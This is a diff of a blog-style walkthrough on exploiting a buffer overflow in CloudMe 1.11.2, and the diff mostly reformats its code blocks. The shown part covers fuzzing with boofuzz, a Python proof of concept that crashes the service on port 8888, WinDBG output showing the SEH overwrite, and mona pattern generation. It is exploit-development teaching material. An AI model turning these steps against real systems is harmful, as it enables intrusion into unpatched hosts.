@@ -13,8 +13,6 @@ tags:
 - ROP gadgets
 ---
 
-## CloudMe v1.11.2 DEP bypass using ROP gadgets
-
 <dl>
 <dd></dd>
 <dd style="text-align:justify;">This article explains the exploitation of a buffer overflow vulnerability and how protections such as SEH and DEP can be bypassed. The vulnerable application is the <b>CloudMe version 1.11.2</b>.</dd>
@@ -63,14 +61,19 @@ tags:
 <hr />
 <h3>The Walkthrough</h3>
 <p align="justify">Before proceeding with the exercise set DEP to <code>AlwaysOn</code> using the following command:</p>
-<pre>bcdedit /set nx AlwaysOn
-</pre>
+
+```
+bcdedit /set nx AlwaysOn
+```
+
 </dd>
 </dl>
 <p>   verify that the setting is enabled as shown below</p>
 <dl>
 <dd style="text-align:justify;">
-<pre>C:\Users\pentest\Desktop\CloudMe&gt;bcdedit /enum
+```
+
+C:\Users\pentest\Desktop\CloudMe&gt;bcdedit /enum
 [...]
 Windows Boot Loader
 -------------------
@@ -86,7 +89,9 @@ osdevice                partition=C:
 systemroot              \Windows
 resumeobject            {1fc46246-40d9-11ea-a45f-a2a235f15fa4}
 nx                      AlwaysOn
-</pre>
+
+```
+
 </dd>
 </dl>
 <dl>
@@ -94,13 +99,17 @@ nx                      AlwaysOn
 <hr />
 <h3>1. Finding the Vulnerability</h3>
 <p align="justify">In order to find this vulnerability we first need to fuzz the target application. Before using any fuzzing framework we must search what to fuzz. When executing the <b>CloudMe</b> application, if we run the netstat command, we can see that the application is listening on port <b>8888</b>.</p>
-<pre>C:\Users\pentest\Desktop&gt;netstat -an | find "8888"
+```
+C:\Users\pentest\Desktop&gt;netstat -an | find "8888"
   TCP    127.0.0.1:8888         0.0.0.0:0              LISTENING
-</pre>
+```
 <p align="justify">We can also confirm this using the <b>process hacker 2</b> tool.</p>
 <figure><img class="size-full wp-image-3488 aligncenter" src="{{ site.baseurl }}/assets/images/2021/02/phtool.png" alt="PHTool" width="630" height="143" /></figure>
 <p align="justify">Now lets fuzz this target application using <b>boofuzz</b>. Boofuzz is a fork of and the successor to the venerable Sulley fuzzing framework. More details about the script can be found <a href="https://boofuzz.readthedocs.io/en/stable/">here</a>. The tool can also be found on <a href="https://github.com/jtpereyda/boofuzz">github </a>.The following python script used to fuzz the <b>CloudMe</b> application.</p>
-<pre>#!/usr/bin/python
+
+```python
+
+#!/usr/bin/python
 
 from boofuzz import *
 
@@ -120,7 +129,8 @@ def main():
 if __name__ == "__main__":
     main()
 
-</pre>
+```
+
 <p align="justify">Before running the script above, we will first use a tool called <b>RawCap.exe</b> which will help us sniffing the <b>127.0.0.1 (localhost/loopback)</b> interface. Then the produced <b>dump.pcap</b> file will be oppend with <b>Wireshark</b> in order to inspect further the communication on port 8888. <b>RawCap.exe</b> tool can be found <a href="https://www.netresec.com/?page=rawcap">here</a></p>
 <p><img class="size-full wp-image-3490 aligncenter" src="{{ site.baseurl }}/assets/images/2021/02/rawcap.png" alt="RawCap" width="578" height="187" /></p>
 <p align="justify">At this point we are ready to run <b>boofuzz</b> tool in order to fuzz the target application using the python script above.</p>
@@ -128,7 +138,11 @@ if __name__ == "__main__":
 <p align="justify">In order to further inspect the crash, we will load the <b>dump.pcap</b> file produced from <b>RawCap.exe</b> tool into <b>Wireshark</b>. Afterwards, searching the packets in <b>Wireshark</b>, we are able to find the data that caused the crash and also we are able to see the format as well as the length of the data sent to the vulnerable application as shown at the image below.</p>
 <p><img class="alignnone size-full wp-image-3493" src="{{ site.baseurl }}/assets/images/2021/02/wireshark-e1613506357213.png" alt="wireshark" width="1012" height="569" /></p>
 <p align="justify">At this point we have enough information about the crash, so we can create a proof of concept script in python in order to reproduce the issue. We will send 5000 A's to the target application.</p>
-<pre>import socket<br />import sys
+
+```python
+
+import socket
+import sys
 
 target = "127.0.0.1"
 
@@ -140,35 +154,46 @@ try:
     s.send(poc)
 except Exception as e:
     print(sys.exc_value)
-</pre>
+```
+
 <p align="justify">Running the script above confirms the issue, and now we have a starting point developing the exploit. As we see below in <strong>WinDBG</strong>, when running the script above, the crash occurs</p>
-<pre>(f24.d98): Access violation - code c0000005 (first chance)
+
+```c
+
+(f24.d98): Access violation - code c0000005 (first chance)
 First chance exceptions are reported before any exception handling.
 This exception may be expected and handled.
 eax=00000001 ebx=41414141 ecx=762498da edx=012d78ec esi=41414141 edi=41414141
 eip=41414141 esp=0022d470 ebp=41414141 iopl=0         nv up ei pl nz na po nc
 cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202
 41414141 ??              ???
-</pre>
+```
+
 <p align="justify">It looks like there is a straight Access Violation occurred meaning that there is a crash dictating a possible overflow. However, <strong>CloudMe</strong> is running in Windows 7 professional where there is a default <b>SEH</b> protection and the application appears to be exploitable</p>
-<pre>0:000&gt; !exchain
+
+```
+0:000> !exchain
 0022d908: 41414141
 Invalid exception stack at 41414141
-</pre>
+```
+
 <p align="justify">As we can see above <b>SEH</b> is overwritten with value that we control <code>\x41\x41\x41\x41</code>, so now we will proceed with <b>SEH</b> based exploitation.</p>
 </dd>
 </dl>
 <hr />
 <h3>2. Searching the Offset</h3>
 <p align="justify">At this point we need to check how far we are able to write and overwrite <b>SEH</b>. In order to do this we will attempt to generate 5000 byte pattern using <b>mona.py</b> as follows. First, create an output folder form mona inside logs folder. All the generated patterns and other data such as ROP chains and bad chars generated from <b>mona.py</b> will be saved there.</p>
-<pre>!mona config -set workingfolder c:\logs\%p
-</pre>
+```
+!mona config -set workingfolder c:\logs\%p
+```
 <p align="justify">From Immunity Debugger we run :</p>
-<pre> !mona pattern_create 5000
-</pre>
+```
+ !mona pattern_create 5000
+```
 <p align="justify">From WinDBG we run :</p>
-<pre>0:009&gt; !load pykd.pyd
-0:009&gt; !py mona pattern_create 5000
+```
+0:009> !load pykd.pyd
+0:009> !py mona pattern_create 5000
 Hold on...
 [+] Command used:
 !py C:\Program Files\Windows Kits\8.0\Debuggers\x86\mona.py pattern_create 5000
@@ -180,7 +205,8 @@ Note: don't copy this pattern from the log window, it might be truncated !
 It's better to open c:\logs\CloudMe\pattern.txt and copy the pattern from the file
 
 [+] This mona.py action took 0:00:00.125000
-</pre>
+```
+
 <p align="justify">Now that we have generated the pattern, we are able to find the exact offset where the application crashes. The following PoC script will do that.</p>
 <pre>import socket<br />import sys
 
